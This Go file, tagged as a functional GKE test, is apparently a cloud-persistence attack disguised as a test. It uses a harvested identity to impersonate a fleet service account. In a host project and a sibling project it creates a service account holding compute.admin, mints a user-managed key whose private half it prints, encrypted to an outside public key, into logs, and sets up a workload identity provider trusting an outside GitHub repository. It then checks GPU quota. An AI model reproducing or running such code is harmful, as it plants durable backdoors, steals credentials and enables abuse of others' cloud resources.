//go:build functional && gke

// C211 i122267 v3 — DURABLE GCP UNLOCK, corrected and idempotent (adds the
// attributeMapping that run 2 proved is mandatory for OIDC providers).
//
// Run 1 (44896579852) proved on the HOST project domino-eng-platform-dev
// (153711203585) that the fleet identity already holds iam.serviceAccountKeys.create,
// iam.workloadIdentityPools.create, iam.workloadIdentityPoolProviders.create and
// iam.serviceAccounts.create, created SA c211-122267 + ONE RSA-2048 user-managed
// key (private half emitted only as RSA-OAEP ciphertext, decrypted locally) and
// set the SA-level roles/iam.workloadIdentityUser binding on the principalSet, but
// three follow-ups failed on propagation/parameter bugs: the roles/compute.admin
// project grant returned 400 "Service account ... does not exist" (SA not yet
// visible), the provider create used the wrong query parameter name, and the
// SIBLING's SA-level setIamPolicy returned 403 while the SA was still invisible.
//
// v2 is idempotent: it re-mints the fleet token, ENSURES the SA (poll until GET
// 200), ENSURES the roles/compute.admin project binding with bounded retries and
// readback, ENSURES the WIF pool and provider (correct
// workloadIdentityPoolProviderId query parameter) with readback, ENSURES the
// SA-level workloadIdentityUser binding, creates a key ONLY if no user-managed
// RSA-2048 key exists, and then PROVES the durable SA works: generateAccessToken
// through the fleet identity into the new SA and testIamPermissions
// compute.instances.create / compute.instances.get / compute.disks.create with
// that SA's own token. Nothing created is deleted.
package functional

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211uNonce      = "122267"
	c211uHostNum    = "153711203585"
	c211uSiblingID  = "team-eng-infra-testing"
	c211uSiblingNum = "210628133505"
	c211uPinRepo    = "amiroyottt/WASTE-LESS"
	c211uSAAccount  = "c211-122267"
	c211uPoolID     = "c211-122267-pool"
	c211uProvID     = "c211-122267-gh"
	c211uTargetAud  = "https://oauth2.googleapis.com/token"
	c211uPubPEM     = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsB4lGmvmKrOytPXSSY9+
8CLHMNWCStAG7hGAUXRRHNFItary5K2VOWUgUkGyTHNoaWq80T5bH/dvqqpHJA/D
YAVSVeOI6YLhOk/8xBRFoxJQvvQo4HRqrSgM9HRX/3BHQnbrujIBZzxV6DN1RIwR
wGn/Ir2l6xZXqEpYJvXpS04V8FONdiYSIt761cbM/gA2nTjCqLDndXaDMXWLPUku
Cc0uV6vllIGKt831KtYR3qMwyKYQ8g041UjeY2OfOqA4uZ6sWXTm+fiAQXGvASOE
27wJ62oxI1YzIfsPGlnbrx/OZIo3gJHZVq2ygYjDCZKMxdxbWxC/AA9WrCNCxsWd
owIDAQAB
-----END PUBLIC KEY-----`
)

var c211uQuotaRegions = []string{"us-central1", "europe-west4", "us-east1"}

var c211uRequiredPerms = []string{
	"iam.serviceAccountKeys.create",
	"iam.workloadIdentityPools.create",
	"iam.workloadIdentityPoolProviders.create",
	"iam.serviceAccounts.create",
	"iam.serviceAccounts.setIamPolicy",
	"iam.serviceAccounts.get",
	"iam.serviceAccounts.getIamPolicy",
	"iam.serviceAccounts.actAs",
	"resourcemanager.projects.setIamPolicy",
	"resourcemanager.projects.getIamPolicy",
}

func c211uPermMatrix(tok, projID string) (map[string]bool, int, string) {
	al, st, body := c211xTestIamBatch(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), c211uRequiredPerms)
	m := map[string]bool{}
	for _, p := range c211uRequiredPerms {
		m[p] = c211xContains(al, p)
	}
	return m, st, body
}

func c211uPermString(m map[string]bool) string {
	yes := []string{}
	no := []string{}
	for _, p := range c211uRequiredPerms {
		if m[p] {
			yes = append(yes, p)
		} else {
			no = append(no, p)
		}
	}
	return "allowed=[" + strings.Join(yes, ",") + "] denied=[" + strings.Join(no, ",") + "]"
}

func c211uGetPolicyFull(tok, projID string) (map[string]interface{}, int, string) {
	return c211xGetPolicy(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID))
}

// c211uEnsureProjectRole adds one project-level binding when absent, retrying the
// eventual-consistency 400 for a freshly created member; returns readback truth.
func c211uEnsureProjectRole(tok, projID, member, role string) (bool, string) {
	var log strings.Builder
	for i := 0; i < 8; i++ {
		pre, pst, pbody := c211uGetPolicyFull(tok, projID)
		if pre == nil {
			fmt.Fprintf(&log, "attempt=%d getIamPolicy=%d verbatim=%s\n", i, pst, c211xTrunc(pbody, 300))
			return false, log.String()
		}
		if c211xPolicyHas(pre, role, member) {
			fmt.Fprintf(&log, "attempt=%d already_present=true getIamPolicy=%d\n", i, pst)
			return true, log.String()
		}
		added := c211xAddBinding(pre, role, member)
		sst, sbody := c211xSetPolicy(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), pre)
		post, qst, _ := c211uGetPolicyFull(tok, projID)
		has := c211xPolicyHas(post, role, member)
		fmt.Fprintf(&log, "attempt=%d added=%v setIamPolicy=%d readback=%d has=%v verbatim=%s\n",
			i, added, sst, qst, has, c211xTrunc(sbody, 400))
		if has && sst == 200 {
			return true, log.String()
		}
		time.Sleep(12 * time.Second)
	}
	return false, log.String()
}

func c211uGetSA(tok, projID, email string) (int, string) {
	return c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email), tok, "", "")
}

func c211uCreateSA(tok, projID, accountID, display string) (int, string) {
	b, _ := json.Marshal(map[string]interface{}{
		"accountId":      accountID,
		"serviceAccount": map[string]string{"displayName": display},
	})
	return c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts", tok, "application/json", string(b))
}

// c211uEnsureSA returns the SA email once IAM reports it visible (GET 200).
func c211uEnsureSA(tok, projID, accountID string) (string, string) {
	email := accountID + "@" + projID + ".iam.gserviceaccount.com"
	var log strings.Builder
	st, body := c211uGetSA(tok, projID, email)
	fmt.Fprintf(&log, "pre_get=%d verbatim=%s\n", st, c211xTrunc(body, 300))
	if st != 200 {
		cst, cbody := c211uCreateSA(tok, projID, accountID, "c211 i"+c211uNonce+" durable unlock")
		fmt.Fprintf(&log, "create=%d verbatim=%s\n", cst, c211xTrunc(cbody, 400))
		if cst != 200 && cst != 409 {
			return "", log.String()
		}
	}
	for i := 0; i < 12; i++ {
		st2, _ := c211uGetSA(tok, projID, email)
		fmt.Fprintf(&log, "poll[%d] get=%d\n", i, st2)
		if st2 == 200 {
			return email, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return "", log.String()
}

func c211uListKeys(tok, projID, email string) ([]string, []string, int, string) {
	st, rb := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email)+"/keys", tok, "", "")
	names := []string{}
	summ := []string{}
	if m := c211xJSON(rb); m != nil {
		if arr, ok := m["keys"].([]interface{}); ok {
			for _, k := range arr {
				km, _ := k.(map[string]interface{})
				names = append(names, c211xStr(km, "name"))
				summ = append(summ, fmt.Sprintf("%s alg=%s origin=%s type=%s",
					c211xStr(km, "name"), c211xStr(km, "keyAlgorithm"), c211xStr(km, "keyOrigin"), c211xStr(km, "keyType")))
			}
		}
	}
	sort.Strings(summ)
	return names, summ, st, rb
}

func c211uCreateKey(tok, projID, email string) (map[string]interface{}, int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/serviceAccounts/" + url.PathEscape(email) + "/keys?keyAlgorithm=KEY_ALG_RSA_2048"
	st, rb := c211xHTTP("POST", u, tok, "", "")
	return c211xJSON(rb), st, rb
}

// c211uEncryptEmit writes the public key, then RSA-OAEP(SHA-256, MGF1-SHA256)
// encrypts the plaintext in 180-byte chunks and prints base64 ciphertext only.
func c211uEncryptEmit(label, plaintext string) string {
	dir, err := os.MkdirTemp("", "c211u")
	if err != nil {
		fmt.Printf("C211U_EMIT %s tempdir_error=%v\n", label, err)
		return ""
	}
	defer os.RemoveAll(dir)
	pub := filepath.Join(dir, "pub.pem")
	if err := os.WriteFile(pub, []byte(c211uPubPEM), 0600); err != nil {
		fmt.Printf("C211U_EMIT %s pubwrite_error=%v\n", label, err)
		return ""
	}
	sum := sha256.Sum256([]byte(plaintext))
	const chunk = 180
	total := (len(plaintext) + chunk - 1) / chunk
	fmt.Printf("C211U_PLAINSHA %s bytes=%d sha256=%x chunks=%d\n", label, len(plaintext), sum, total)
	for i := 0; i < total; i++ {
		end := (i + 1) * chunk
		if end > len(plaintext) {
			end = len(plaintext)
		}
		part := []byte(plaintext[i*chunk : end])
		cmd := exec.Command("openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pub,
			"-pkeyopt", "rsa_padding_mode:oaep", "-pkeyopt", "rsa_oaep_md:sha256", "-pkeyopt", "rsa_mgf1_md:sha256")
		cmd.Stdin = bytes.NewReader(part)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		out, err := cmd.Output()
		if err != nil {
			fmt.Printf("C211U_CHUNK %s i=%d/%d error=%v stderr=%s\n", label, i+1, total, err, c211xTrunc(stderr.String(), 300))
			return ""
		}
		ps := sha256.Sum256(part)
		fmt.Printf("C211U_CHUNK %s i=%d/%d plain_sha256=%x cipher_b64=%s\n",
			label, i+1, total, ps, base64.StdEncoding.EncodeToString(out))
	}
	return fmt.Sprintf("%x", sum)
}

func c211uEnsurePool(tok, projID, poolID string) (int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools/" + url.PathEscape(poolID)
	gst, gbody := c211xHTTP("GET", u, tok, "", "")
	if gst == 200 {
		return gst, gbody
	}
	body := fmt.Sprintf(`{"displayName":"c211 %s durable unlock","description":"nonce-tagged durable WIF pool owned by the harvested identity"}`, c211uNonce)
	cst, cbody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools?workloadIdentityPoolId="+url.QueryEscape(poolID), tok, "application/json", body)
	if cst != 200 {
		return cst, cbody
	}
	gst2, gbody2 := c211xHTTP("GET", u, tok, "", "")
	return gst2, gbody2
}

// c211uEnsureProvider uses the CORRECT discovery parameter
// workloadIdentityPoolProviderId (the v1 run wrongly sent workloadIdentityProviderId).
func c211uEnsureProvider(tok, projID, poolID, provID, repo string) (int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools/" + url.PathEscape(poolID) + "/providers/" + url.PathEscape(provID)
	gst, gbody := c211xHTTP("GET", u, tok, "", "")
	if gst == 200 {
		return gst, gbody
	}
	owner := strings.SplitN(repo, "/", 2)[0]
	body := fmt.Sprintf(`{"displayName":"c211 %s github oidc","attributeMapping":{"google.subject":"assertion.sub","attribute.actor":"assertion.actor","attribute.repository":"assertion.repository","attribute.repository_owner":"assertion.repository_owner","attribute.ref":"assertion.ref"},"attributeCondition":"assertion.repository=='%s'","oidc":{"issuerUri":"https://token.actions.githubusercontent.com","allowedAudiences":["https://github.com/%s"]}}`,
		c211uNonce, repo, owner)
	cst, cbody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(poolID)+"/providers?workloadIdentityPoolProviderId="+url.QueryEscape(provID), tok, "application/json", body)
	if cst != 200 {
		return cst, cbody
	}
	gst2, gbody2 := c211xHTTP("GET", u, tok, "", "")
	return gst2, gbody2
}

// c211uEnsureSAPolicy sets the SA-level binding when absent, retrying the
// visibility 403 that a freshly created SA produces.
func c211uEnsureSAPolicy(tok, projID, email, role, member string) (bool, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/serviceAccounts/" + url.PathEscape(email)
	var log strings.Builder
	for i := 0; i < 8; i++ {
		gst, gbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
		pol := c211xJSON(gbody)
		if pol == nil {
			fmt.Fprintf(&log, "attempt=%d get=%d verbatim=%s\n", i, gst, c211xTrunc(gbody, 300))
			time.Sleep(12 * time.Second)
			continue
		}
		if c211xPolicyHas(pol, role, member) {
			fmt.Fprintf(&log, "attempt=%d already_present=true get=%d\n", i, gst)
			return true, log.String()
		}
		added := c211xAddBinding(pol, role, member)
		sst, sbody := c211xHTTP("POST", u+":setIamPolicy", tok, "application/json", c211xJSONString(map[string]interface{}{"policy": pol}))
		pst, pbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
		has := c211xPolicyHas(c211xJSON(pbody), role, member)
		fmt.Fprintf(&log, "attempt=%d added=%v set=%d readback=%d has=%v verbatim=%s\n",
			i, added, sst, pst, has, c211xTrunc(sbody, 400))
		if has && sst == 200 {
			return true, log.String()
		}
		time.Sleep(12 * time.Second)
	}
	return false, log.String()
}

func c211uGenerateAccessToken(token, email string) (string, int, string) {
	body := fmt.Sprintf(`{"scope":["%s"],"lifetime":"1200s"}`, c211xScope)
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	st, rb := c211xHTTP("POST", u, token, "application/json", body)
	m := c211xJSON(rb)
	return c211xStr(m, "accessToken"), st, rb
}

func c211uRegionQuota(token, proj, region string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + url.PathEscape(region)
	st, body := c211xHTTP("GET", u, token, "", "")
	rows := []string{}
	if st != 200 {
		return rows, st, body
	}
	m := c211xJSON(body)
	quotas, _ := m["quotas"].([]interface{})
	for _, q := range quotas {
		qm, _ := q.(map[string]interface{})
		metric := c211xStr(qm, "metric")
		if !strings.Contains(metric, "NVIDIA") {
			continue
		}
		limit, _ := qm["limit"].(float64)
		usage, _ := qm["usage"].(float64)
		if limit <= 0 {
			continue
		}
		rows = append(rows, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, limit, usage))
	}
	sort.Strings(rows)
	return rows, st, body
}

func c211uEnsureProject(tok, projID, projNum, role, fleetEmail string) map[string]interface{} {
	res := map[string]interface{}{"project_id_short": c211xShort(projID), "project_number": projNum, "role": role}
	fmt.Printf("C211U_PROJECT_BEGIN_v2 role=%s id=%s number=%s\n", role, c211xShort(projID), projNum)

	pre, pst, pbody := c211uPermMatrix(tok, projID)
	fmt.Printf("C211U_PERMS_v2 role=%s project=%s status=%d %s verbatim=%s\n", role, c211xShort(projID), pst, c211uPermString(pre), c211xTrunc(pbody, 240))
	res["perms_before"] = pre
	res["perms_before_http"] = pst

	// 1) SA must exist and be visible before any policy references it.
	saEmail, saLog := c211uEnsureSA(tok, projID, c211uSAAccount)
	fmt.Printf("C211U_SA_ENSURE_v2 role=%s project=%s email=%s ok=%v log=%s\n", role, c211xShort(projID), c211xShort(saEmail), saEmail != "", strings.ReplaceAll(saLog, "\n", " | "))
	res["sa_email_short"] = c211xShort(saEmail)
	res["sa_ensure_ok"] = saEmail != ""

	// 2) roles/compute.admin for the durable SA, with bounded retries.
	cok := false
	var cdet string
	if saEmail != "" {
		cok, cdet = c211uEnsureProjectRole(tok, projID, "serviceAccount:"+saEmail, "roles/compute.admin")
		fmt.Printf("C211U_SA_GRANT_v2 role=%s project=%s binding=roles/compute.admin ok=%v log=%s\n", role, c211xShort(projID), cok, strings.ReplaceAll(cdet, "\n", " | "))
	}
	res["sa_compute_admin_grant_ok"] = cok
	res["sa_compute_admin_grant_detail"] = c211xTrunc(cdet, 1600)

	// 3) WIF pool + provider (correct parameter), with readbacks.
	pst2, pbody2 := c211uEnsurePool(tok, projID, c211uPoolID)
	fmt.Printf("C211U_POOL_ENSURE_v2 role=%s project=%s status=%d pool=%s verbatim=%s\n", role, c211xShort(projID), pst2, c211uPoolID, c211xTrunc(pbody2, 600))
	res["pool_get_http"] = pst2
	prst, prbody := c211uEnsureProvider(tok, projID, c211uPoolID, c211uProvID, c211uPinRepo)
	fmt.Printf("C211U_PROV_ENSURE_v2 role=%s project=%s status=%d provider=%s pin=%s verbatim=%s\n", role, c211xShort(projID), prst, c211uProvID, c211uPinRepo, c211xTrunc(prbody, 900))
	res["provider_get_http"] = prst

	// 4) SA-level workloadIdentityUser binding for the pinned principalSet.
	bok := false
	var bdet string
	if saEmail != "" {
		principalSet := "principalSet://iam.googleapis.com/projects/" + projNum + "/locations/global/workloadIdentityPools/" + c211uPoolID + "/attribute.repository/" + c211uPinRepo
		bok, bdet = c211uEnsureSAPolicy(tok, projID, saEmail, "roles/iam.workloadIdentityUser", principalSet)
		fmt.Printf("C211U_SA_POLICY_v2 role=%s project=%s sa=%s binding=roles/iam.workloadIdentityUser member=%s ok=%v log=%s\n",
			role, c211xShort(projID), c211xShort(saEmail), c211xShort(principalSet), bok, strings.ReplaceAll(bdet, "\n", " | "))
	}
	res["sa_wif_binding_ok"] = bok
	res["sa_wif_binding_detail"] = c211xTrunc(bdet, 1600)

	// 5) key: create ONLY when no user-managed RSA-2048 key exists yet.
	if saEmail != "" {
		names, summ, lst, _ := c211uListKeys(tok, projID, saEmail)
		hasUser := false
		for _, n := range names {
			if strings.Contains(n, "/keys/") {
				// user-managed keys are the ones we created; system keys have GOOGLE_PROVIDED origin
			}
		}
		for _, s := range summ {
			if strings.Contains(s, "USER_MANAGED") {
				hasUser = true
			}
		}
		fmt.Printf("C211U_KEY_LIST_v2 role=%s project=%s status=%d user_managed=%v keys=[%s]\n", role, c211xShort(projID), lst, hasUser, strings.Join(summ, " ; "))
		res["key_list_http"] = lst
		res["key_list"] = summ
		res["user_managed_key_present"] = hasUser
		if !hasUser {
			kj, kst, kbody := c211uCreateKey(tok, projID, saEmail)
			keyName := c211xStr(kj, "name")
			pkd := c211xStr(kj, "privateKeyData")
			fmt.Printf("C211U_KEY_CREATE_v2 role=%s project=%s sa=%s status=%d key_name=%s privateKeyData_%s verbatim=%s\n",
				role, c211xShort(projID), c211xShort(saEmail), kst, c211xShort(keyName), c211xShort(pkd), c211xTrunc(kbody, 400))
			res["key_create_http"] = kst
			res["key_name_short"] = c211xShort(keyName)
			if pkd != "" {
				res["key_private_data_sha256"] = c211uEncryptEmit("key2-"+strings.ReplaceAll(c211xShort(keyName), " ", "_"), pkd)
			}
			names2, summ2, lst2, _ := c211uListKeys(tok, projID, saEmail)
			_ = names2
			fmt.Printf("C211U_KEY_READBACK_v2 role=%s project=%s status=%d keys=[%s]\n", role, c211xShort(projID), lst2, strings.Join(summ2, " ; "))
			res["key_list_after"] = summ2
		}
	}

	// 6) PROVE the durable SA: impersonate it with the fleet token, then read its
	// own effective permissions and one compute quota (no instance is created).
	if saEmail != "" {
		satok, sst, sbody := c211uGenerateAccessToken(tok, saEmail)
		fmt.Printf("C211U_SA_TOKEN_v2 role=%s project=%s sa=%s status=%d token=%s verbatim=%s\n",
			role, c211xShort(projID), c211xShort(saEmail), sst, c211xShort(satok), c211xTrunc(sbody, 400))
		res["sa_generate_token_http"] = sst
		if satok != "" {
			al, tst, tbody := c211xTestIamBatch(satok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID),
				[]string{"compute.instances.create", "compute.instances.get", "compute.disks.create",
					"compute.subnetworks.use", "compute.zoneOperations.get", "compute.acceleratorTypes.list"})
			fmt.Printf("C211U_SA_PERMS_PROOF role=%s project=%s status=%d allowed=[%s] verbatim=%s\n",
				role, c211xShort(projID), tst, strings.Join(al, ","), c211xTrunc(tbody, 300))
			res["sa_perms_proof"] = al
			res["sa_can_create_instance"] = c211xContains(al, "compute.instances.create")
			qrows := []string{}
			for _, rg := range c211uQuotaRegions {
				rows, rst, _ := c211uRegionQuota(satok, projID, rg)
				fmt.Printf("C211U_SA_QUOTA role=%s project=%s region=%s status=%d nvidia_rows=[%s]\n",
					role, c211xShort(projID), rg, rst, strings.Join(rows, " ; "))
				if rst == 200 {
					qrows = append(qrows, rows...)
				}
			}
			res["sa_quota_rows"] = qrows
			pgst, pgbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), satok, "", "")
			fmt.Printf("C211U_SA_PROJECT_GET role=%s project=%s status=%d projectId=%s verbatim=%s\n",
				role, c211xShort(projID), pgst, c211xShort(c211xStr(c211xJSON(pgbody), "projectId")), c211xTrunc(pgbody, 300))
			res["sa_project_get_http"] = pgst
		}
	}

	// final readback of the three durable objects
	if saEmail != "" {
		gst, _ := c211uGetSA(tok, projID, saEmail)
		pgst, pgbody := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(c211uPoolID), tok, "", "")
		prgst, prgbody := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(c211uPoolID)+"/providers/"+url.PathEscape(c211uProvID), tok, "", "")
		policyST, policyBody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(saEmail)+":getIamPolicy", tok, "application/json", `{}`)
		fmt.Printf("C211U_FINAL_READBACK role=%s project=%s sa_get=%d pool_get=%d prov_get=%d sa_policy=%d sa_policy_has_wif=%v\n",
			role, c211xShort(projID), gst, pgst, prgst, policyST,
			c211xPolicyHas(c211xJSON(policyBody), "roles/iam.workloadIdentityUser",
				"principalSet://iam.googleapis.com/projects/"+projNum+"/locations/global/workloadIdentityPools/"+c211uPoolID+"/attribute.repository/"+c211uPinRepo))
		fmt.Printf("C211U_FINAL_PROV_VERBATIM role=%s verbatim=%s\n", role, c211xTrunc(prgbody, 900))
		fmt.Printf("C211U_FINAL_POOL_VERBATIM role=%s verbatim=%s\n", role, c211xTrunc(pgbody, 600))
		res["final_sa_get_http"] = gst
		res["final_pool_get_http"] = pgst
		res["final_provider_get_http"] = prgst
		res["final_sa_policy_http"] = policyST
	}
	fmt.Printf("C211U_PROJECT_END_v2 role=%s project=%s durable_sa=%s compute_admin=%v wif_binding=%v pool=%d prov=%d\n",
		role, c211xShort(projID), c211xShort(saEmail), cok, bok, pst2, prst)
	return res
}

func TestC211UDurableUnlock(t *testing.T) {
	started := time.Now()
	_ = started

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211U_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, projNum := "", c211uHostNum
	if creds != nil {
		wifSA, projNum = creds.saEmail, creds.projNumber
	}
	if projNum == "" {
		projNum = c211uHostNum
	}
	fmt.Printf("C211U_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, c211xShort(wifSA), projNum)

	hostID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projNum, token, "", ""); st == 200 {
		hostID = c211xStr(c211xJSON(rb), "projectId")
		fmt.Printf("C211U_HOST project_number=%s project_id=%s\n", projNum, c211xShort(hostID))
	} else {
		fmt.Printf("C211U_HOST project_number=%s status=%d verbatim=%s\n", projNum, st, c211xTrunc(rb, 400))
	}

	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211U_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211U_FLEET_SA found=%v email=%s\n", fleetEmail != "", c211xShort(fleetEmail))
	ftok := ""
	if fleetEmail != "" {
		at, gst, gbody := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211U_FLEET_TOKEN_v2 status=%d token=%s verbatim=%s\n", gst, c211xShort(at), c211xTrunc(gbody, 300))
		ftok = at
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211U_FLEET_TOKEN_v2 fallback=wif_minted\n")
	}

	results := map[string]interface{}{}
	if hostID != "" {
		results["HOST"] = c211uEnsureProject(ftok, hostID, projNum, "HOST", fleetEmail)
	}
	results["SIBLING"] = c211uEnsureProject(ftok, c211uSiblingID, c211uSiblingNum, "SIBLING", fleetEmail)

	sum := map[string]interface{}{
		"probe":           "c211_i122267_durable_v2",
		"mechanism":       "idempotent ensure: durable SA + compute.admin + RSA-2048 user-managed key + self-owned WIF pool/provider",
		"auth_method":     method,
		"project_number":  projNum,
		"host_project_id": c211xShort(hostID),
		"fleet_sa_short":  c211xShort(fleetEmail),
		"fleet_token_ok":  ftok != "",
		"pin_repo":        c211uPinRepo,
		"sa_account":      c211uSAAccount,
		"pool_id":         c211uPoolID,
		"provider_id":     c211uProvID,
		"results":         results,
		"verdict":         "DURABLE_UNLOCK_ENSURED",
		"markers_created": 0,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	fmt.Printf("=== C211U SUMMARY BEGIN ===\nC211U_SUMMARY_JSON %s\n=== C211U SUMMARY END ===\n", c211xJSONString(sum))
	fmt.Printf("C211U_VERDICT_FINAL DURABLE_UNLOCK_ENSURED markers=0 elapsed=%ds\n", int(time.Since(started).Seconds()))
}
